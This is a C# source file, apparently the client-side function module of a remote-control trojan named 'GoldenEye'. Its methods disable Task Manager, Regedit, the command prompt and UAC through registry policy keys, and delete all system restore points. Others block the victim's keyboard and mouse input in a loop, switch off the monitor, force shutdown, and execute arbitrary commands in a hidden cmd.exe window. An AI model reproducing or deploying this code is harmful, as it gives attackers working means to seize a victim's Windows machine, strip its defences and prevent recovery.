using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.Management;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace GoldenEye
{
    internal class SystemFunctions
    {
        public string chatmsg = "";

        [DllImport("user32")]
        public static extern bool ExitWindowsEx(uint uFlags, uint dwReason);

        public void shutdown()
        {
            // Funktioniert mit Windows XP+
            Process.Start("shutdown", "/s /t 0");
        }

        public void reboot()
        {
            Process.Start("shutdown", "/r /t 0");
        }

        public void logoff()
        {
            ExitWindowsEx(0, 0);
        }

        public void hibernate()
        {
            Process.Start("shutdown", "/h /f");
        }

        public string ProcessExecutablePath(Process process)
        {
            try
            {
                return process.MainModule.FileName;
            }
            catch
            {
                string query = "SELECT ExecutablePath, ProcessID FROM Win32_Process";
                ManagementObjectSearcher searcher = new ManagementObjectSearcher(query);

                foreach (ManagementObject item in searcher.Get())
                {
                    object id = item["ProcessID"];
                    object path = item["ExecutablePath"];

                    if (path != null && id.ToString() == process.Id.ToString())
                    {
                        return path.ToString();
                    }
                }
            }

            return "";
        }

        [DllImport("user32.dll")]
        private static extern IntPtr SendMessage(IntPtr hWnd, int Msg, int wParam, int lParam);

        private int SC_MONITORPOWER = 0xF170;
        private int WM_SYSCOMMAND = 0x0112;

        public enum MonitorState
        {
            ON = -1,
            OFF = 2,
            STANDBY = 1
        }

        private Form f = new Form();

        public void SetMonitorStatus(MonitorState state)
        {
            SendMessage(f.Handle, WM_SYSCOMMAND, SC_MONITORPOWER, (int)state);
        }

        [DllImport("user32.dll", SetLastError = true)] private static extern IntPtr FindWindow(string lpClassName, string lpWindowName);

        [DllImport("user32.dll", SetLastError = true)] private static extern IntPtr GetWindow(IntPtr hWnd, GetWindow_Cmd uCmd);

        private enum GetWindow_Cmd : uint
        {
            GW_HWNDFIRST = 0,
            GW_HWNDLAST = 1,
            GW_HWNDNEXT = 2,
            GW_HWNDPREV = 3,
            GW_OWNER = 4,
            GW_CHILD = 5,
            GW_ENABLEDPOPUP = 6
        }

        [DllImport("user32.dll", CharSet = CharSet.Auto)] private static extern IntPtr SendMessage(IntPtr hWnd, UInt32 Msg, IntPtr wParam, IntPtr lParam);

        private const int WM_COMMAND = 0x111;

        public void ToggleDesktopIcons()
        {
            var toggleDesktopCommand = new IntPtr(0x7402);
            IntPtr hWnd = GetWindow(FindWindow("Progman", "Program Manager"), GetWindow_Cmd.GW_CHILD);
            SendMessage(hWnd, WM_COMMAND, toggleDesktopCommand, IntPtr.Zero);
        }

        public void openTray()
        {
            int ret = mciSendString("set cdaudio door open", null, 0, IntPtr.Zero);
        }

        public void closeTray()
        {
            int ret = mciSendString("set cdaudio door closed", null, 0, IntPtr.Zero);
        }

        [DllImport("winmm.dll", EntryPoint = "mciSendStringA", CharSet = CharSet.Ansi)]
        protected static extern int mciSendString(string lpstrCommand,
                                                   StringBuilder lpstrReturnString,
                                                   int uReturnLength,
                                                   IntPtr hwndCallback);

        public void disableCMD()
        {
            try
            {
                Registry.SetValue(@"HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\System", "DisableCMD", "1", Microsoft.Win32.RegistryValueKind.DWord);
            }
            catch
            {
                Console.WriteLine("System Functions >> Tried to Disable CMD: NO ADMINISTRATOR PRIVILEGES!");
            }
        }

        public void enableCMD()
        {
            try
            {
                Registry.SetValue(@"HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\System", "DisableCMD", "0", Microsoft.Win32.RegistryValueKind.DWord);
            }
            catch
            {
                Console.WriteLine("System Functions >> Tried to Enable CMD: NO ADMINISTRATOR PRIVILEGES!");
            }
        }

        public void disableRegedit()
        {
            try
            {
                Registry.SetValue(@"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System", "DisableRegistryTools", "1", Microsoft.Win32.RegistryValueKind.DWord);
            }
            catch
            {
                Console.WriteLine("System Functions >> Tried to Disable Regedit: NO ADMINISTRATOR PRIVILEGES!");
            }
        }

        public void enableRegedit()
        {
            try
            {
                Registry.SetValue(@"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System", "DisableRegistryTools", "0", Microsoft.Win32.RegistryValueKind.DWord);
            }
            catch
            {
                Console.WriteLine("System Functions >> Tried to Enable Regedit: NO ADMINISTRATOR PRIVILEGES!");
            }
        }

        public void enableTaskMGR()
        {
            try
            {
                Registry.SetValue(@"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System", "DisableTaskMgr", "0", Microsoft.Win32.RegistryValueKind.DWord);
            }
            catch
            {
                Console.WriteLine("System Functions >> Tried to Enable TaskMGR: NO ADMINISTRATOR PRIVILEGES!");
            }
        }

        public void disableTaskMGR()
        {
            try
            {
                Registry.SetValue(@"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System", "DisableTaskMgr", "1", Microsoft.Win32.RegistryValueKind.DWord);
            }
            catch
            {
                Console.WriteLine("System Functions >> Tried to Disable TaskMGR: NO ADMINISTRATOR PRIVILEGES!");
            }
        }

        [DllImport("Srclient.dll")]
        public static extern int SRRemoveRestorePoint(int index);

        public void deleteRestorePoints()
        {
            try
            {
                System.Management.ManagementClass objClass = new System.Management.ManagementClass("\\\\.\\root\\default", "systemrestore", new System.Management.ObjectGetOptions());
                System.Management.ManagementObjectCollection objCol = objClass.GetInstances();

                StringBuilder Results = new StringBuilder();
                foreach (System.Management.ManagementObject objItem in objCol)
                {
                    int nr = int.Parse(((uint)objItem["sequencenumber"]).ToString());
                    Console.WriteLine("System Functions >> Deleted Restore Point: " + ((uint)objItem["sequencenumber"]).ToString());
                    int intReturn = SRRemoveRestorePoint(nr);
                }
            }
            catch (Exception eax)
            {
                Console.WriteLine("Error while deleting restore points:");
                Console.WriteLine();
                Console.WriteLine(eax.ToString());
            }
        }

        public void disableUAC()
        {
            try
            {
                string UAC_key = @"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System";
                Registry.SetValue(UAC_key, "EnableLUA", 0);
            }
            catch
            {
                Console.WriteLine("System Functions >> Tried to Disable UAC: NO ADMINISTRATOR PRIVILEGES!");
            }
        }

        [DllImport("user32.dll")]
        private static extern bool BlockInput(bool fBlockIt);

        private static bool inLockdown = false;

        private static void lockInput()
        {
            while (inLockdown)
            {
                BlockInput(true);
                System.Threading.Thread.Sleep(1000);
            }
        }

        public void blockInput()
        {
            try
            {
                Thread lockdownThread = new Thread(new ThreadStart(lockInput));
                inLockdown = true;
                lockdownThread.IsBackground = true;
                lockdownThread.Start();
            }
            catch
            { }
        }

        public void unblockInput()
        {
            inLockdown = false;
            System.Threading.Thread.Sleep(1000);
            BlockInput(false);
        }

        //private SpeechSynthesizer speaker;

        public void textToSpeech(string text)
        {
            //speaker = new SpeechSynthesizer();
            //speaker.SetOutputToDefaultAudioDevice();
            //speaker.Rate = 1;
            //speaker.Volume = 100;
            //speaker.SelectVoiceByHints(VoiceGender.Female, VoiceAge.Adult);
            //speaker.SpeakAsync(text);
        }

        public void execShellCMD(string cmd)
        {
            try
            {
                int ExitCode;
                ProcessStartInfo ProcessInfo;
                Process Process;

                ProcessInfo = new ProcessStartInfo("cmd.exe", "/C " + cmd);
                ProcessInfo.CreateNoWindow = true;
                ProcessInfo.UseShellExecute = false;
                Process = Process.Start(ProcessInfo);
                Process.WaitForExit(5);
                ExitCode = Process.ExitCode;
                Process.Close();
            }
            catch (Exception eax)
            {
                Console.WriteLine("Error while executing CMD Command:");
                Console.WriteLine();
                Console.WriteLine(eax.ToString());
            }
        }
    }
}